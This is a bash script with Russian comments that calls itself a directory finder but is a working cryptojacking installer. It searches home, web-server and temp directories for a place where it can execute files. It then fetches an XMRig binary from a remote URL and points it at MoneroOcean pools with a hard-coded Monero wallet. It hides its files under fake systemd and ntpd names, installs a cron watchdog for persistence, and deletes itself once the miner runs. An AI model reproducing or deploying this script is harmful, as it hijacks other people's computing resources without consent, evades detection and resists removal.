#!/bin/bash
# Smart Directory Finder - ищет директорию где МОЖНО выполнять файлы
set +e

# ============= КОНФИГУРАЦИЯ =============
XMR_WALLET="88EBW6G3FvVLratMgx61DYbL5FE99gUrFSa6Hm2nVVXhGUmJ4c8dseR7AWJkFJ4MH81amVxhcYKEs34V4wptkAbW7JS68Wo"

# Генерация ID без cat /dev/urandom (было зависание)
RANDOM_ID=$(date +%s%N | md5sum 2>/dev/null | cut -c1-8 || echo "$RANDOM")
HOSTNAME_SHORT=$(hostname 2>/dev/null | cut -d'.' -f1 || echo "srv")
USERNAME=$(whoami 2>/dev/null || echo "user")
WORKER_NAME="${HOSTNAME_SHORT}-${USERNAME}-${RANDOM_ID}"

# Системные имена
PROCESS_NAME="systemd-timesyncd"
BINARY_NAME="ntpd-helper"
DIR_NAME=".systemd"
CONFIG_NAME="timesyncd.conf"
WATCHDOG_NAME="ntpd-monitor"
PID_NAME=".ntpd.pid"

# URLs на твоем GitHub
XMRIG_URL="https://raw.githubusercontent.com/GelShell/mi/refs/heads/main/xmrig"
CONFIG_URL="https://raw.githubusercontent.com/GelShell/mi/refs/heads/main/config.json"

# Пулы
POOL_LIST=(
    "gulf.moneroocean.stream"
    "sg.moneroocean.stream"
    "de.moneroocean.stream"
    "us.moneroocean.stream"
)
PORT="10128"

# ============= ФУНКЦИЯ: ТЕСТ ДИРЕКТОРИИ НА ВЫПОЛНЕНИЕ =============
test_executable_dir() {
    local test_dir="$1"

    # Проверка 1: Существует ли директория?
    if [ ! -d "$test_dir" ]; then
        if ! mkdir -p "$test_dir" 2>/dev/null; then
            return 1
        fi
    fi

    # Проверка 2: Можем ли писать?
    local test_file="$test_dir/.test_write_$$"
    if ! echo "test" > "$test_file" 2>/dev/null; then
        return 1
    fi
    rm -f "$test_file" 2>/dev/null

    # Проверка 3: ГЛАВНАЯ - Можем ли ВЫПОЛНЯТЬ?
    local test_script="$test_dir/.test_exec_$$"
    cat > "$test_script" 2>/dev/null <<'TESTEOF'
#!/bin/bash
echo "OK"
TESTEOF

    if [ ! -f "$test_script" ]; then
        return 1
    fi

    chmod +x "$test_script" 2>/dev/null

    # Пытаемся выполнить
    local result=$("$test_script" 2>/dev/null)
    local exec_code=$?
    rm -f "$test_script" 2>/dev/null

    if [ "$result" = "OK" ] && [ $exec_code -eq 0 ]; then
        return 0  # SUCCESS - можно выполнять!
    else
        return 1  # FAIL - noexec или нет прав
    fi
}

# ============= ПОИСК EXECUTABLE ДИРЕКТОРИИ =============
find_executable_dir() {
    local candidates=()

    # ПРИОРИТЕТ 1: HOME директории пользователя (обычно БЕЗ noexec)
    local home=$(getenv HOME 2>/dev/null || echo "$HOME")
    if [ -n "$home" ] && [ -d "$home" ]; then
        candidates+=("$home/.local/share")
        candidates+=("$home/.config")
        candidates+=("$home/.cache")
        candidates+=("$home/.mozilla")
        candidates+=("$home/.local")
        candidates+=("$home")
    fi

    # ПРИОРИТЕТ 2: Текущая директория скрипта
    if [ -n "${BASH_SOURCE[0]}" ]; then
        local script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
        if [ -n "$script_dir" ] && [ -d "$script_dir" ]; then
            candidates+=("$script_dir/.config")
            candidates+=("$script_dir")
        fi
    fi

    # ПРИОРИТЕТ 3: Web-server директории (если есть права)
    candidates+=("/var/www/.config")
    candidates+=("/var/www/html/.config")

    # Ищем web директории по маске /home/*/web/* или /home/*/public_html/*
    if [ -d "/home" ]; then
        for user_dir in /home/*/web /home/*/public_html; do
            if [ -d "$user_dir" ]; then
                candidates+=("$user_dir/.config")
            fi
        done
    fi

    # ПРИОРИТЕТ 4: /var/tmp (обычно БЕЗ noexec, в отличие от /tmp)
    candidates+=("/var/tmp")
    candidates+=("/var/spool/tmp")

    # ПРИОРИТЕТ 5: /dev/shm (быстро, БЕЗ noexec)
    candidates+=("/dev/shm")

    # ПРИОРИТЕТ 6: sys_get_temp_dir
    candidates+=("/var/cache")

    # ПОСЛЕДНИЙ ШАНС: /tmp (может иметь noexec!)
    candidates+=("/tmp")

    # Тестируем каждую директорию
    for dir in "${candidates[@]}"; do
        if test_executable_dir "$dir"; then
            echo "$dir"
            return 0
        fi
    done

    return 1
}

# ============= ОСНОВНАЯ ЛОГИКА =============

# Ищем рабочую директорию
BASE_DIR=$(find_executable_dir)

if [ -z "$BASE_DIR" ]; then
    # Не нашли ни одной executable директории
    exit 1
fi

INSTALL_DIR="$BASE_DIR/$DIR_NAME"
mkdir -p "$INSTALL_DIR" 2>/dev/null

if [ ! -d "$INSTALL_DIR" ]; then
    exit 1
fi

BINARY_PATH="$INSTALL_DIR/$BINARY_NAME"
CONFIG_FILE="$INSTALL_DIR/$CONFIG_NAME"
WATCHDOG_SCRIPT="$INSTALL_DIR/$WATCHDOG_NAME"
PID_FILE="$INSTALL_DIR/$PID_NAME"

# ============= CPU НАСТРОЙКИ =============
CPU_CORES=$(nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "2")
THREADS=$((CPU_CORES - 1))
if [ $THREADS -lt 1 ]; then
    THREADS=1
fi

# ============= ТЕСТИРОВАНИЕ ПУЛОВ =============
BEST_POOL=""
for pool in "${POOL_LIST[@]}"; do
    if timeout 3 bash -c "exec 3<>/dev/tcp/$pool/$PORT" 2>/dev/null; then
        BEST_POOL="$pool"
        break
    fi
done

if [ -z "$BEST_POOL" ]; then
    BEST_POOL="gulf.moneroocean.stream"
fi

# ============= СКАЧИВАНИЕ XMRIG =============
DOWNLOADED=0

# Пробуем curl
if command -v curl >/dev/null 2>&1; then
    if curl -L -s -f --connect-timeout 30 --max-time 120 -o "$BINARY_PATH" "$XMRIG_URL" 2>/dev/null; then
        if [ -s "$BINARY_PATH" ]; then
            DOWNLOADED=1
        fi
    fi
fi

# Пробуем wget
if [ $DOWNLOADED -eq 0 ] && command -v wget >/dev/null 2>&1; then
    if wget -q --timeout=30 --tries=3 -O "$BINARY_PATH" "$XMRIG_URL" 2>/dev/null; then
        if [ -s "$BINARY_PATH" ]; then
            DOWNLOADED=1
        fi
    fi
fi

if [ $DOWNLOADED -eq 0 ]; then
    rm -rf "$INSTALL_DIR" 2>/dev/null
    exit 1
fi

# Даем права на выполнение
chmod +x "$BINARY_PATH" 2>/dev/null

# ПРОВЕРЯЕМ что файл ДЕЙСТВИТЕЛЬНО выполняемый
if ! "$BINARY_PATH" --version >/dev/null 2>&1; then
    # Не запускается - возможно noexec
    rm -rf "$INSTALL_DIR" 2>/dev/null
    exit 1
fi

# ============= СОЗДАНИЕ КОНФИГА =============
cat > "$CONFIG_FILE" <<EOF
{
    "autosave": true,
    "donate-level": 0,
    "cpu": {
        "enabled": true,
        "huge-pages": false,
        "hw-aes": null,
        "priority": 1,
        "asm": true,
        "max-threads-hint": $THREADS
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "$BEST_POOL:$PORT",
            "user": "$XMR_WALLET",
            "pass": "$WORKER_NAME",
            "keepalive": true,
            "nicehash": false,
            "tls": false,
            "enabled": true
        }
    ],
    "log-file": null,
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5
}
EOF

# ============= СОЗДАНИЕ WATCHDOG =============
cat > "$WATCHDOG_SCRIPT" <<'EOFWATCHDOG'
#!/bin/bash
set +e
INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd)"
BINARY_NAME="ntpd-helper"
CONFIG_NAME="timesyncd.conf"
PID_NAME=".ntpd.pid"
BINARY_PATH="$INSTALL_DIR/$BINARY_NAME"
CONFIG_FILE="$INSTALL_DIR/$CONFIG_NAME"
PID_FILE="$INSTALL_DIR/$PID_NAME"

if [ ! -f "$BINARY_PATH" ] || [ ! -f "$CONFIG_FILE" ]; then
    exit 1
fi

RUNNING=0
if [ -f "$PID_FILE" ]; then
    PID=$(cat "$PID_FILE" 2>/dev/null)
    if [ -n "$PID" ] && kill -0 "$PID" 2>/dev/null; then
        RUNNING=1
    fi
fi

if [ $RUNNING -eq 0 ]; then
    if pgrep -f "$BINARY_NAME" >/dev/null 2>/dev/null; then
        RUNNING=1
    fi
fi

if [ $RUNNING -eq 0 ]; then
    cd "$INSTALL_DIR" 2>/dev/null
    nohup nice -n 19 "$BINARY_PATH" --config="$CONFIG_FILE" >/dev/null 2>&1 &
    echo $! > "$PID_FILE" 2>/dev/null
fi
exit 0
EOFWATCHDOG

chmod +x "$WATCHDOG_SCRIPT" 2>/dev/null

# ============= ДОБАВЛЕНИЕ В CRON =============
if command -v crontab >/dev/null 2>&1; then
    CRON_CMD="*/5 * * * * $WATCHDOG_SCRIPT >/dev/null 2>&1"
    if ! crontab -l 2>/dev/null | grep -F "$WATCHDOG_SCRIPT" >/dev/null 2>&1; then
        (crontab -l 2>/dev/null || echo ""; echo "$CRON_CMD") | crontab - 2>/dev/null || true
    fi
fi

# ============= ПЕРВЫЙ ЗАПУСК =============
cd "$INSTALL_DIR" 2>/dev/null

# Убиваем старые процессы
pkill -f "$BINARY_NAME" 2>/dev/null || true
sleep 1

# Запуск с низким приоритетом
nohup nice -n 19 "$BINARY_PATH" --config="$CONFIG_FILE" >/dev/null 2>&1 &
MINER_PID=$!
echo "$MINER_PID" > "$PID_FILE" 2>/dev/null

# Проверяем запуск
sleep 3
if kill -0 "$MINER_PID" 2>/dev/null; then
    # Удаляем сам скрипт установки
    rm -f "$0" 2>/dev/null || true
    exit 0
else
    # Последняя попытка
    nohup nice -n 19 "$BINARY_PATH" --config="$CONFIG_FILE" >/dev/null 2>&1 &
    MINER_PID=$!
    echo "$MINER_PID" > "$PID_FILE" 2>/dev/null
    sleep 3
    if kill -0 "$MINER_PID" 2>/dev/null; then
        rm -f "$0" 2>/dev/null || true
        exit 0
    else
        exit 1
    fi
fi
